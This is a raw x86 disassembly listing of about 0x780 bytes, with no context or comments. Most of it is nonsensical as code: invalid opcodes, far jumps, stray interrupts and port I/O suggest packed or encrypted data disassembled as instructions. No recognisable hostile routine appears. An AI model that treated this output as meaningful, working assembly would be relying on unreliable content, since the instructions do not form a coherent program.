  4089f2:	jmp    0x91a8:0x489ba913
  4089f9:	inc    eax
  4089fa:	inc    ebp
  4089fb:	leave  
  4089fc:	js     0x408a20
  4089fe:	retf   
  4089ff:	xchg   edi,eax
  408a00:	sub    cl,BYTE PTR [esi-0x7a74e4d6]
  408a06:	pop    esp
  408a07:	sub    BYTE PTR [eax],dl
  408a09:	push   ecx
  408a0a:	jne    0x4089f5
  408a0c:	cld    
  408a0d:	mov    DWORD PTR [esi],0x3c02f796
  408a13:	jmp    0x408a60
  408a15:	mov    edx,DWORD PTR [esi]
  408a17:	adc    eax,0x2b005743
  408a1c:	pusha  
  408a1d:	ficom  DWORD PTR [esi]
  408a1f:	sbb    DWORD PTR [esp+ecx*1],0xffffffe3
  408a23:	fcomp  st(0)
  408a25:	add    al,0x9c
  408a27:	and    BYTE PTR [edx],bl
  408a29:	fsub   DWORD PTR [ebx+ebx*4-0x7f]
  408a2d:	imul   cl
  408a2f:	adc    al,0x99
  408a31:	lock sbb eax,DWORD PTR [ebp-0x7f193df]
  408a38:	inc    ebx
  408a39:	mov    al,0xfa
  408a3b:	dec    ecx
  408a3c:	or     ecx,esp
  408a3e:	xchg   edi,eax
  408a3f:	loop   0x408a8b
  408a41:	mov    ebp,0x50f00875
  408a46:	jle    0x408a58
  408a48:	clc    
  408a49:	inc    edx
  408a4a:	or     ah,BYTE PTR [eax-0x66236345]
  408a50:	mov    ds:0x1bdadde5,eax
  408a55:	test   esp,esi
  408a57:	xor    esi,edx
  408a59:	jnp    0x408a4d
  408a5b:	scas   al,BYTE PTR es:[edi]
  408a5c:	pushf  
  408a5d:	aam    0xf
  408a5f:	(bad)  
  408a60:	fdiv   st,st(1)
  408a62:	test   al,0x27
  408a64:	loop   0x408ade
  408a66:	mov    esi,0x8dd7dad8
  408a6b:	js     0x408ab9
  408a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a6e:	cmp    al,0x32
  408a70:	fadd   QWORD PTR [ecx+0x21]
  408a73:	addr16 pop edx
  408a75:	fwait
  408a76:	jbe    0x408aaa
  408a78:	mov    ah,0x99
  408a7a:	and    eax,0xde8bcaa9
  408a7f:	mov    cl,0x52
  408a81:	addr16 out dx,eax
  408a83:	jge    0x408adf
  408a85:	loopne 0x408a40
  408a87:	aas    
  408a88:	push   ds
  408a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a8a:	xor    DWORD PTR [eax+0x17],esp
  408a8d:	imul   ebx,DWORD PTR gs:[ebx+0x7],0x7b98488c
  408a95:	cmp    al,bh
  408a97:	cmp    al,0x61
  408a99:	stc    
  408a9a:	jno    0x408ad8
  408a9c:	cmp    al,0x39
  408a9e:	add    eax,eax
  408aa0:	test   ebx,ebx
  408aa2:	xchg   ebp,eax
  408aa3:	jecxz  0x408a8b
  408aa5:	cwde   
  408aa6:	ds js  0x408acd
  408aa9:	es loope 0x408a69
  408aac:	ins    DWORD PTR es:[edi],dx
  408aad:	loope  0x408b2c
  408aaf:	fldcw  WORD PTR [ecx+eax*8-0x1efbb017]
  408ab6:	int    0x9f
  408ab8:	shl    BYTE PTR [esp+edi*8+0x2eafbda2],cl
  408abf:	cmc    
  408ac0:	(bad)  
  408ac1:	mov    ds:0x4a2ba7aa,al
  408ac6:	pop    ss
  408ac7:	ret    
  408ac8:	mov    dh,0x68
  408aca:	popa   
  408acb:	xor    al,0xa0
  408acd:	pop    ebx
  408ace:	xchg   ebp,eax
  408acf:	test   eax,0xa125e6d3
  408ad4:	xor    ebx,DWORD PTR [esi]
  408ad6:	out    dx,al
  408ad7:	imul   eax,DWORD PTR [ebp+0x62aff1c9],0xffffffd8
  408ade:	xchg   edi,eax
  408adf:	in     eax,dx
  408ae0:	repz std 
  408ae2:	fadd   st(4),st
  408ae4:	push   esi
  408ae5:	outs   dx,DWORD PTR ds:[esi]
  408ae6:	cli    
  408ae7:	jl     0x408b16
  408ae9:	inc    esi
  408aea:	xor    BYTE PTR [edi-0x2c],ah
  408aed:	adc    esi,ebp
  408aef:	jns    0x408adb
  408af1:	dec    ecx
  408af2:	adc    esp,ebp
  408af4:	mov    al,ds:0x195ce615
  408af9:	mov    esp,0xb633a8bf
  408afe:	mov    ?,WORD PTR [ebx-0x1cdae2f4]
  408b04:	dec    esi
  408b05:	xchg   ebx,eax
  408b06:	fnstsw WORD PTR [ecx+edx*2+0x42]
  408b0a:	dec    esp
  408b0b:	adc    DWORD PTR [ecx+0x6c],edx
  408b0e:	push   0x31
  408b10:	dec    esp
  408b11:	in     al,0xd1
  408b13:	sub    al,0x89
  408b15:	mov    esi,esp
  408b17:	and    bh,BYTE PTR [ecx-0x31]
  408b1a:	addr16 inc esi
  408b1c:	shl    esi,1
  408b1e:	xchg   edi,eax
  408b1f:	loop   0x408b78
  408b21:	xor    al,0x56
  408b23:	add    BYTE PTR [eax],dl
  408b25:	pop    esi
  408b26:	int3   
  408b27:	cmp    ebx,esi
  408b29:	fdivp  st(4),st
  408b2b:	loop   0x408b6d
  408b2d:	aaa    
  408b2e:	jns    0x408b6d
  408b30:	pushf  
  408b31:	fdiv   st(2),st
  408b33:	cmp    ebx,0xffffffa3
  408b36:	test   BYTE PTR [edx+esi*1-0x50cad3e7],ah
  408b3d:	mov    bh,0x36
  408b3f:	sub    eax,0x2f189d20
  408b44:	leave  
  408b45:	imul   esp,ebp,0x68c1e52f
  408b4b:	and    dh,BYTE PTR [ebx+0x2ed2968]
  408b51:	xchg   esp,eax
  408b52:	pop    esi
  408b53:	scas   eax,DWORD PTR es:[edi]
  408b54:	repz xchg ebx,eax
  408b56:	les    ebx,FWORD PTR [ecx-0x24]
  408b59:	(bad)
  408b5c:	mov    gs,WORD PTR ds:0x143433c
  408b62:	mov    al,ds:0x323c0663
  408b67:	xchg   ebx,eax
  408b68:	pop    eax
  408b69:	inc    edx
  408b6a:	adc    eax,0x4d6c06e2
  408b6f:	push   ebp
  408b70:	pop    eax
  408b71:	adc    edx,ecx
  408b73:	cmp    DWORD PTR [ebp-0x61f3ef78],ecx
  408b79:	call   0x98b1492e
  408b7e:	jmp    0x4d32:0xd1ef
  408b84:	xor    BYTE PTR [ebx],ah
  408b86:	xchg   DWORD PTR [edi+0x4f5a2f5e],ebx
  408b8c:	or     eax,0xf7d8bd0b
  408b91:	out    0xd3,eax
  408b93:	retf   0x384b
  408b96:	cmc    
  408b97:	xor    DWORD PTR [ebp+0x6213810a],ecx
  408b9d:	cdq    
  408b9e:	xlat   BYTE PTR ds:[ebx]
  408b9f:	xchg   edi,eax
  408ba0:	lds    edi,FWORD PTR ds:0x7bc88d34
  408ba6:	mov    ds:0xac18da3b,eax
  408bab:	mov    esp,0xdb3fbaae
  408bb0:	(bad)  
  408bb1:	sub    DWORD PTR [ebx+0x5d9d81ba],edx
  408bb7:	aas    
  408bb8:	xchg   edi,eax
  408bb9:	lock mov ch,ah
  408bbc:	dec    ebp
  408bbd:	cmp    BYTE PTR [edi-0x17],dl
  408bc0:	int    0x11
  408bc2:	add    BYTE PTR [edi-0x68],ch
  408bc5:	imul   ebp,DWORD PTR [eax+0x64],0x42
  408bc9:	pop    ebp
  408bca:	push   edx
  408bcb:	sbb    al,0x21
  408bcd:	pop    ecx
  408bce:	cld    
  408bcf:	xor    ch,BYTE PTR [ebp+0x1ad1273]
  408bd5:	xchg   esp,eax
  408bd6:	ja     0x408c4c
  408bd8:	cmp    al,0x34
  408bda:	shl    DWORD PTR [ecx+ecx*1+0x534836ab],1
  408be1:	jo     0x408ba2
  408be3:	mov    bh,0x78
  408be5:	jmp    0x408b6f
  408be7:	jp     0x408b99
  408be9:	jo     0x408c5b
  408beb:	test   DWORD PTR [edi],0x27ccd389
  408bf1:	int    0x3b
  408bf3:	outs   dx,DWORD PTR ds:[esi]
  408bf4:	lods   eax,DWORD PTR ds:[esi]
  408bf5:	sub    eax,eax
  408bf7:	imul   eax,DWORD PTR [ecx+0x4fa1a4d6],0xffffffb1
  408bfe:	mov    ds:0xf3459b09,al
  408c03:	leave  
  408c04:	pop    ss
  408c05:	sub    DWORD PTR [eax],0x15e97a3
  408c0b:	xchg   edx,eax
  408c0c:	inc    ebx
  408c0d:	sbb    eax,DWORD PTR [ebp-0xe]
  408c10:	inc    edi
  408c11:	xchg   edx,eax
  408c12:	cld    
  408c13:	into   
  408c14:	sahf   
  408c15:	cwde   
  408c16:	sub    ebp,DWORD PTR [eax]
  408c18:	stc    
  408c19:	cmp    eax,0xbba1f5a3
  408c1e:	ins    BYTE PTR es:[edi],dx
  408c1f:	fiadd  WORD PTR [edi-0x33]
  408c22:	fild   DWORD PTR [ecx+ebx*2-0x3b222cf7]
  408c29:	jo     0x408bec
  408c2b:	mov    bl,0x2e
  408c2d:	mov    ah,0xcc
  408c2f:	mov    al,ds:0xd4e5890b
  408c34:	inc    esp
  408c35:	cld    
  408c36:	jl     0x408c62
  408c38:	xchg   ecx,eax
  408c39:	pushf  
  408c3a:	mov    BYTE PTR [ecx+0x3],cl
  408c3d:	jnp    0x408c74
  408c3f:	xchg   ecx,eax
  408c40:	xchg   ecx,eax
  408c41:	and    al,0xdb
  408c43:	mov    eax,DWORD PTR [ebp-0x20]
  408c46:	mov    edx,DWORD PTR [ebp-0x8]
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	jbe    0x408c01
  408c61:	in     eax,dx
  408c62:	push   0x7c7ce46c
  408c67:	xlat   BYTE PTR ds:[ebx]
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408ca4
  408c6c:	int    0x8e
  408c6e:	push   0x52
  408c70:	jo     0x408cd3
  408c72:	xchg   ebx,ebx
  408c74:	popf   
  408c75:	rcr    BYTE PTR [ebp-0x67df1658],1
  408c7b:	jb     0x408c46
  408c7d:	mov    cl,0xcf
  408c7f:	pop    esi
  408c80:	jg     0x408c77
  408c82:	les    esi,FWORD PTR [ecx+ecx*2+0x3b1a8201]
  408c89:	imul   eax,DWORD PTR [edx],0x46
  408c8c:	adc    BYTE PTR [edi+0x43b329b3],cl
  408c92:	or     DWORD PTR [esi-0x7d],edx
  408c95:	popa   
  408c96:	aaa    
  408c97:	dec    edx
  408c98:	retf   
  408c99:	sbb    eax,0x22a76723
  408c9e:	jne    0x408ce4
  408ca0:	mov    edi,0xddf76888
  408ca5:	and    BYTE PTR [esi+0x57],ch
  408ca8:	adc    bh,BYTE PTR ds:0x1a1318c4
  408cae:	rcl    BYTE PTR [ebx+0x3e3094f7],cl
  408cb4:	xchg   edx,eax
  408cb5:	mov    ebp,0xbae70c3e
  408cba:	push   eax
  408cbb:	mov    ebp,0xf46e3b8b
  408cc0:	xor    al,BYTE PTR fs:[ecx-0x43]
  408cc4:	jmp    0x136948fa
  408cc9:	shr    DWORD PTR [esi],1
  408ccb:	jne    0x408c56
  408ccd:	mov    dl,0x46
  408ccf:	mov    dl,0x5d
  408cd1:	xchg   esi,eax
  408cd2:	imul   ecx,ebp,0x47
  408cd5:	inc    edx
  408cd6:	push   edi
  408cd7:	inc    ebx
  408cd8:	and    al,0xfe
  408cda:	test   DWORD PTR [ecx-0x8786aab],eax
  408ce0:	mov    al,ds:0x7fe2e715
  408ce5:	push   0x51
  408ce7:	stos   DWORD PTR es:[edi],eax
  408ce8:	sbb    dl,dl
  408cea:	jl     0x408d3f
  408cec:	mov    dh,0x83
  408cee:	int3   
  408cef:	out    dx,al
  408cf0:	je     0x408d18
  408cf2:	ins    BYTE PTR es:[edi],dx
  408cf3:	call   0x479:0xf93387d8
  408cfa:	(bad)  
  408cfb:	sbb    ch,BYTE PTR [ebp+0x3e]
  408cfe:	and    ah,BYTE PTR [esp+edi*4+0x5f5dd4c3]
  408d05:	inc    ebx
  408d06:	jbe    0x408ce9
  408d08:	outs   dx,DWORD PTR ds:[esi]
  408d09:	mov    edx,0xa7d6df66
  408d0e:	cmp    esp,ecx
  408d10:	sub    ecx,DWORD PTR [esi-0x16]
  408d13:	pop    ebp
  408d14:	add    DWORD PTR [esi-0x7b],0x8578f9e6
  408d1b:	jnp    0x408cb6
  408d1d:	mov    ebp,0x368e7513
  408d22:	cmc    
  408d23:	jno    0x408d94
  408d25:	adc    eax,0x32e42050
  408d2a:	arpl   di,sp
  408d2c:	(bad)  
  408d2d:	pop    ebx
  408d2e:	jb     0x408d97
  408d30:	inc    ebp
  408d31:	popf   
  408d32:	stc    
  408d33:	pop    ss
  408d34:	and    DWORD PTR [edx+0x7208ca1f],eax
  408d3a:	cdq    
  408d3b:	pop    ecx
  408d3c:	aad    0x1c
  408d3e:	sbb    edx,DWORD PTR [ebx-0x3118416b]
  408d44:	pop    ss
  408d45:	out    dx,eax
  408d46:	sti    
  408d47:	mov    bl,dl
  408d49:	punpckhbw mm2,QWORD PTR [esi+ebp*2-0x631f2c1d]
  408d51:	cmp    edx,DWORD PTR [ecx-0x2f]
  408d54:	push   ds
  408d55:	xchg   ebp,eax
  408d56:	pop    edi
  408d57:	or     bh,BYTE PTR [edi]
  408d59:	leave  
  408d5a:	pushf  
  408d5b:	mov    ah,0x20
  408d5d:	sti    
  408d5e:	xor    BYTE PTR [edx-0x494939c4],cl
  408d64:	fnstsw WORD PTR [esi]
  408d66:	cwde   
  408d67:	jl     0x408dbe
  408d69:	dec    eax
  408d6a:	in     eax,dx
  408d6b:	jno    0x408d7c
  408d6d:	push   esp
  408d6e:	mov    DWORD PTR [esi+0x70],0x576780e4
  408d75:	cmp    eax,0xf469031a
  408d7a:	cmp    BYTE PTR [esi-0x31],ch
  408d7d:	dec    ebx
  408d7e:	(bad)  
  408d7f:	xor    al,BYTE PTR [ebx-0xdc146d1]
  408d85:	mov    al,0x29
  408d87:	or     ch,bl
  408d89:	sbb    BYTE PTR [esi-0x78],0x13
  408d8d:	xchg   ebx,eax
  408d8e:	mov    ds:0x4d825138,eax
  408d93:	ret    
  408d94:	xor    eax,0x3cc33331
  408d99:	cmp    dh,BYTE PTR ds:[ebx-0x1ff2f024]
  408da0:	xchg   DWORD PTR [ebx-0x2067abd],ebp
  408da6:	push   ecx
  408da7:	jp     0x408e05
  408da9:	and    DWORD PTR [esi+0x18],esi
  408dac:	cli    
  408dad:	mov    bl,0xfb
  408daf:	mov    BYTE PTR [edi-0x76],0x57
  408db3:	dec    ebx
  408db4:	outs   dx,BYTE PTR ds:[esi]
  408db5:	loope  0x408dda
  408db7:	ins    BYTE PTR es:[edi],dx
  408db8:	idiv   BYTE PTR [ebx+edi*4-0x1d]
  408dbc:	and    dl,BYTE PTR [edx-0x76]
  408dbf:	repz out dx,eax
  408dc1:	stc    
  408dc2:	pusha  
  408dc3:	retf   
  408dc4:	jecxz  0x408d7b
  408dc6:	aaa    
  408dc7:	rcl    BYTE PTR [ebx],cl
  408dc9:	daa    
  408dca:	test   al,0x9d
  408dcc:	in     eax,0xe5
  408dce:	test   BYTE PTR [edx+0x30],bh
  408dd1:	push   cs
  408dd2:	dec    esi
  408dd3:	xchg   ebp,eax
  408dd4:	mov    WORD PTR [ecx],?
  408dd6:	mov    ecx,0x805e362f
  408ddb:	xlat   BYTE PTR ds:[ebx]
  408ddd:	pushf  
  408dde:	push   edx
  408ddf:	dec    edx
  408de0:	(bad)  
  408de2:	xchg   DWORD PTR [edi+0x56],esp
  408de5:	ins    DWORD PTR es:[edi],dx
  408de6:	lods   eax,DWORD PTR ds:[esi]
  408de7:	or     BYTE PTR [ecx],bh
  408de9:	stos   BYTE PTR es:[edi],al
  408dea:	mov    DWORD PTR [ebx],esp
  408dec:	cli    
  408ded:	or     ch,bl
  408def:	gs scas al,BYTE PTR es:[edi]
  408df1:	pop    ds
  408df2:	inc    esi
  408df3:	inc    ebp
  408df4:	lods   al,BYTE PTR ds:[esi]
  408df5:	jmp    0x90ce:0x7d7ddf51
  408dfc:	mov    edx,0x6111d25d
  408e01:	xlat   BYTE PTR ds:[ebx]
  408e02:	push   ss
  408e03:	inc    edi
  408e04:	test   al,0x4b
  408e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e07:	push   edi
  408e08:	or     eax,0x222125a2
  408e0d:	mov    esp,0xccad0147
  408e12:	pop    esp
  408e13:	in     eax,0x92
  408e15:	push   ecx
  408e16:	nop
  408e17:	stc    
  408e18:	and    DWORD PTR [esi-0x2b],0xffffffa9
  408e1c:	add    ecx,DWORD PTR [edi+0x39]
  408e1f:	ret    0xcb64
  408e22:	fcomp  QWORD PTR [eax]
  408e24:	test   al,0x4b
  408e26:	in     al,0xde
  408e28:	inc    edx
  408e29:	sub    al,0x19
  408e2b:	mov    ds:0xeb012866,al
  408e30:	outs   dx,DWORD PTR ds:[esi]
  408e31:	test   BYTE PTR [edi-0x6d],dl
  408e34:	mov    eax,ds:0xd4dff939
  408e39:	hlt    
  408e3a:	push   edx
  408e3b:	(bad)
  408e3f:	fistp  DWORD PTR [edi]
  408e41:	jl     0x408e72
  408e43:	aam    0x41
  408e45:	mov    edx,0xa6c73674
  408e4a:	outs   dx,DWORD PTR ds:[esi]
  408e4b:	outs   dx,BYTE PTR ds:[esi]
  408e4c:	sbb    edx,ecx
  408e4e:	popf   
  408e4f:	add    BYTE PTR [ebx*4+0x19be0c89],cl
  408e56:	push   esp
  408e57:	pusha  
  408e58:	and    ebx,DWORD PTR [eax+0x38]
  408e5b:	int    0x10
  408e5d:	jle    0x408e81
  408e5f:	in     eax,0x45
  408e61:	pusha  
  408e62:	rcr    DWORD PTR [edi+0x17d5b03b],1
  408e68:	sub    dl,BYTE PTR [eax+0x48fbf652]
  408e6e:	jmp    0xcd88:0x4d6b893
  408e75:	add    BYTE PTR [eax-0x28],ch
  408e78:	xchg   esi,eax
  408e79:	sub    cl,al
  408e7b:	and    dl,BYTE PTR [ecx+esi*8-0x79]
  408e7f:	pop    eax
  408e80:	push   eax
  408e81:	mov    al,0x15
  408e83:	mov    DWORD PTR [eax-0x5],ecx
  408e86:	retf   
  408e87:	xor    DWORD PTR [eax],ebp
  408e89:	mov    bh,0x34
  408e8b:	test   al,0xdd
  408e8d:	lea    edx,[edi+0x45]
  408e90:	mov    eax,0xd351554e
  408e95:	push   ebx
  408e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e97:	(bad)  
  408e98:	push   DWORD PTR [edi+eax*1+0xd]
  408e9c:	rcl    BYTE PTR [ebx],cl
  408e9e:	jmp    0x408eb2
  408ea0:	jnp    0x408ed0
  408ea2:	lea    esi,[ecx]
  408ea4:	push   ebp
  408ea5:	popa   
  408ea6:	mov    cl,0x2d
  408ea8:	(bad)  
  408ea9:	pop    ds
  408eaa:	les    edi,FWORD PTR [esi]
  408eac:	mov    ebp,0xbd9fb7c5
  408eb1:	inc    ecx
  408eb2:	ret    
  408eb3:	push   edi
  408eb4:	jmp    0xd175:0xa083ddf
  408ebb:	xchg   esi,eax
  408ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ebd:	cmp    DWORD PTR ds:0x7dab867,edx
  408ec3:	bound  esi,QWORD PTR [ecx-0x1acd0cf2]
  408ec9:	adc    DWORD PTR [esi-0x74d747bb],edi
  408ecf:	jne    0x408f00
  408ed1:	inc    edx
  408ed2:	push   ebp
  408ed3:	dec    eax
  408ed4:	mov    edi,0xb9c02923
  408ed9:	or     ch,ah
  408edb:	push   es
  408edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408edd:	adc    al,0x2a
  408edf:	push   eax
  408ee0:	ins    DWORD PTR es:[edi],dx
  408ee1:	icebp  
  408ee2:	mov    cs,WORD PTR [ebp+0x27]
  408ee5:	jmp    0x92beaa8
  408eea:	loopne 0x408f5f
  408eec:	cmp    al,0x16
  408eee:	and    al,0xd2
  408ef0:	lea    ecx,[ebx]
  408ef2:	and    edx,DWORD PTR [edi+0x14]
  408ef5:	adc    BYTE PTR [eax+edx*4+0x45b41cf6],bh
  408efc:	xchg   DWORD PTR [edi-0x5792b71b],eax
  408f02:	adc    BYTE PTR [edx-0x2f],bh
  408f05:	mov    dl,0x19
  408f07:	or     bh,BYTE PTR [edx-0x27ae67b]
  408f0d:	stos   DWORD PTR es:[edi],eax
  408f0e:	or     eax,0xf5375d14
  408f13:	test   dh,ch
  408f15:	fdiv   QWORD PTR [eax]
  408f17:	ret    
  408f18:	dec    ecx
  408f19:	dec    edx
  408f1a:	jge    0x408eb0
  408f1c:	jae    0x408ea2
  408f1e:	jbe    0x408f0e
  408f20:	test   eax,0x32e3367a
  408f25:	sbb    edi,edx
  408f27:	imul   eax,DWORD PTR [ecx+0x268ec0f6],0xece217bb
  408f31:	xor    cl,BYTE PTR [edx+0x1672b924]
  408f37:	aad    0x8a
  408f39:	fucomp st(4)
  408f3b:	inc    eax
  408f3c:	ss ins BYTE PTR es:[edi],dx
  408f3e:	inc    esi
  408f3f:	cmp    al,0x54
  408f41:	push   cs
  408f42:	jge    0x408f30
  408f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f45:	push   es
  408f46:	repz div ebx
  408f49:	stos   BYTE PTR es:[edi],al
  408f4a:	stc    
  408f4b:	(bad)  
  408f4c:	sahf   
  408f4d:	stos   BYTE PTR es:[edi],al
  408f4e:	scas   al,BYTE PTR es:[edi]
  408f4f:	pop    es
  408f50:	inc    BYTE PTR [ecx+0x680069fe]
  408f56:	mov    ch,0x78
  408f58:	jns    0x408fd3
  408f5a:	lock fdivr QWORD PTR [ecx-0x9]
  408f5e:	pop    ecx
  408f5f:	loope  0x408f1a
  408f61:	loopne 0x408f31
  408f63:	sbb    ebp,DWORD PTR [esp+esi*8]
  408f66:	(bad)  
  408f67:	cwde   
  408f68:	es or  ecx,esp
  408f6b:	or     eax,ebx
  408f6d:	stos   DWORD PTR es:[edi],eax
  408f6e:	push   esi
  408f6f:	js     0x408f64
  408f71:	stc    
  408f72:	jbe    0x408f2c
  408f74:	mov    bl,BYTE PTR [eax+0xbf53de0]
  408f7a:	pop    esi
  408f7b:	xor    al,0x6f
  408f7d:	clc    
  408f7e:	xor    al,dl
  408f80:	xor    DWORD PTR [edx-0x68a0cd38],esi
  408f86:	mul    DWORD PTR ds:0x49da8b45
  408f8c:	into   
  408f8d:	(bad)  
  408f8e:	push   esp
  408f8f:	bound  ebx,QWORD PTR [esi-0x2ce2e38e]
  408f95:	cmp    DWORD PTR [edi-0x7c],esp
  408f98:	add    BYTE PTR [ebx+0x37],bh
  408f9b:	mov    esi,ebp
  408f9d:	inc    edx
  408f9e:	test   al,0xa2
  408fa0:	sub    eax,0x701546ca
  408fa5:	mov    al,ds:0xe00fbfec
  408faa:	mov    esi,0x1b3da8e0
  408faf:	mov    ebp,0xbd8b1e5d
  408fb4:	jg     0x409004
  408fb6:	adc    al,0x31
  408fb8:	push   ebx
  408fb9:	hlt    
  408fba:	aaa    
  408fbb:	jg     0x409034
  408fbd:	les    ebx,FWORD PTR [ecx+0x1d]
  408fc0:	loopne 0x408fc9
  408fc2:	dec    ecx
  408fc3:	pop    DWORD PTR [ebx]
  408fc5:	(bad)  
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [esi+eiz*8-0x15],ebp
  408fde:	sbb    eax,0x7ce0c796
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x40903a
  408fe9:	loop   0x408f96
  408feb:	mov    eax,ds:0xdf75e679
  408ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff1:	(bad)  
  408ff2:	and    edx,DWORD PTR [edx+0x40]
  408ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff6:	bound  esp,QWORD PTR [ebx-0x7d88c06f]
  408ffc:	pushf  
  408ffd:	lds    edx,FWORD PTR [edx]
  408fff:	lahf   
  409000:	push   ss
  409001:	(bad)  
  409002:	es push ebx
  409004:	xchg   BYTE PTR [edi+0x7e],ah
  409007:	outs   dx,DWORD PTR ds:[esi]
  409008:	or     esi,DWORD PTR [edi]
  40900a:	add    DWORD PTR [eax+0x61],edx
  40900d:	sbb    esp,esp
  40900f:	call   0x24f:0xefeb6ef0
  409016:	mov    eax,0x6f2ffe1c
  40901b:	cdq    
  40901c:	icebp  
  40901d:	xchg   ebx,eax
  40901e:	arpl   ax,ax
  409020:	bswap  ebx
  409022:	or     bl,BYTE PTR [ebp+0x4511dc6f]
  409028:	dec    esp
  409029:	ficomp WORD PTR [esi-0x761f0665]
  40902f:	push   cs
  409030:	cmp    al,0xff
  409032:	xor    esi,DWORD PTR [ebp+0x9]
  409035:	out    dx,al
  409036:	push   ebp
  409037:	ret    0x4ac6
  40903a:	cs jae 0x409058
  40903d:	jle    0x408fde
  40903f:	mov    dh,0xa5
  409041:	jnp    0x4090c0
  409043:	inc    ecx
  409044:	js     0x40900f
  409046:	xlat   BYTE PTR ds:[ebx]
  409047:	pop    esp
  409048:	and    eax,ecx
  40904a:	mov    cl,0xb3
  40904c:	adc    esp,DWORD PTR [ebx]
  40904e:	hlt    
  40904f:	sbb    BYTE PTR [edi],dl
  409051:	adc    DWORD PTR [ecx+eax*8-0x7e],ebp
  409055:	fwait
  409056:	push   0xa4a21de8
  40905b:	ins    DWORD PTR es:[edi],dx
  40905c:	pop    es
  40905d:	push   ebx
  40905e:	(bad)  
  40905f:	jb     0x409058
  409061:	pop    edi
  409062:	rcr    esi,0x1a
  409065:	mov    edx,0x86688020
  40906a:	jnp    0x4090e5
  40906c:	pop    es
  40906d:	aad    0x37
  40906f:	outs   dx,BYTE PTR ds:[esi]
  409070:	out    dx,eax
  409071:	inc    ebp
  409072:	dec    esp
  409073:	cs dec edi
  409075:	and    eax,0x24e6bd40
  40907a:	popf   
  40907b:	jp     0x4090d2
  40907d:	in     eax,dx
  40907e:	not    dh
  409080:	aas    
  409081:	mov    edx,0xfdc31171
  409086:	mov    DWORD PTR [ebx-0xb217a6f],ebx
  40908c:	dec    ecx
  40908d:	push   edx
  40908e:	xlat   BYTE PTR ds:[ebx]
  40908f:	addr16 fs fs pop ds
  409093:	xchg   edi,eax
  409094:	push   ebp
  409095:	fild   WORD PTR [ebx+0x3f11491f]
  40909b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40909c:	inc    edx
  40909d:	mov    ecx,0xa1ea33f1
  4090a2:	jmp    0x409058
  4090a4:	int3   
  4090a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090a6:	jne    0x4090db
  4090a8:	mov    eax,0xa064106b
  4090ad:	dec    ecx
  4090ae:	aaa    
  4090af:	int    0x30
  4090b1:	mov    BYTE PTR [ecx+0x9],cl
  4090b4:	fld    QWORD PTR [ebp-0x4b]
  4090b7:	int    0xed
  4090b9:	arpl   WORD PTR [ebx-0x56eadf12],sp
  4090bf:	les    edi,FWORD PTR [ecx-0x5a11cf10]
  4090c5:	and    eax,0x7879054a
  4090ca:	ret    0xd797
  4090cd:	inc    esi
  4090ce:	aad    0x0
  4090d0:	shr    BYTE PTR [ecx+0x73],0x68
  4090d4:	push   esp
  4090d5:	into   
  4090d6:	int3   
  4090d7:	inc    ecx
  4090d8:	leave  
  4090d9:	(bad)  
  4090da:	call   0x7367e527
  4090df:	cmp    BYTE PTR [eax+0x35],al
  4090e2:	ret    0xbd86
  4090e5:	push   es
  4090e6:	dec    ebx
  4090e7:	hlt    
  4090e8:	xchg   edi,eax
  4090e9:	and    BYTE PTR [ebp-0x5b],bl
  4090ec:	add    esi,eax
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	xor    edi,DWORD PTR [edx]
  4090f1:	mov    ss,WORD PTR [esi-0x68]
  4090f4:	aas    
  4090f5:	add    bl,BYTE PTR [ecx+edi*8-0x48289e44]
  4090fc:	into   
  4090fd:	mov    eax,ds:0xb4bc6bc1
  409102:	xchg   DWORD PTR [ebx-0x772bc512],ebx
  409108:	add    BYTE PTR [edi-0x6bf1ff3c],dl
  40910e:	pop    edi
  40910f:	aam    0xdb
  409111:	cmp    al,0xc5
  409113:	aad    0xd5
  409115:	fld    DWORD PTR [eax+0x79]
  409118:	fbstp  TBYTE PTR [ebp+0x1e]
  40911b:	ret    0x6640
  40911e:	inc    esi
  40911f:	in     eax,0x1e
  409121:	mov    dh,0x5e
  409123:	imul   ebx,DWORD PTR [ecx],0x77
  409126:	aad    0xb
  409128:	popa   
  409129:	cmp    eax,0xeeaf3234
  40912e:	adc    dh,ch
  409130:	lock das 
  409132:	add    BYTE PTR [eax],0xdc
  409135:	(bad)  
  409136:	adc    ebx,DWORD PTR [eax]
  409138:	xchg   esi,eax
  409139:	loopne 0x409123
  40913b:	ja     0x40918d
  40913d:	ds aaa 
  40913f:	cmp    ah,BYTE PTR [ebp-0x5c]
  409142:	cld    
  409143:	add    cl,BYTE PTR [edi+0x2fa9568]
  409149:	mov    eax,0x508346b4
  40914e:	jno    0x409104
  409150:	jbe    0x409189
  409152:	and    esp,0x19
  409155:	loopne 0x40912c
  409157:	inc    eax
  409158:	enter  0xab0e,0xd5
  40915c:	into   
  40915d:	sub    ebp,eax
  40915f:	mov    esi,0xbaa394c1
  409164:	jle    0x409138
  409166:	imul   edi,DWORD PTR [edx],0xffffffe3
  409169:	(bad)  
  40916a:	popa   
  40916b:	pop    ebx
  40916c:	mov    edx,0x4068d739
  409171:	out    dx,eax
  409172:	jle    0x409161
  409174:	loopne 0x409180
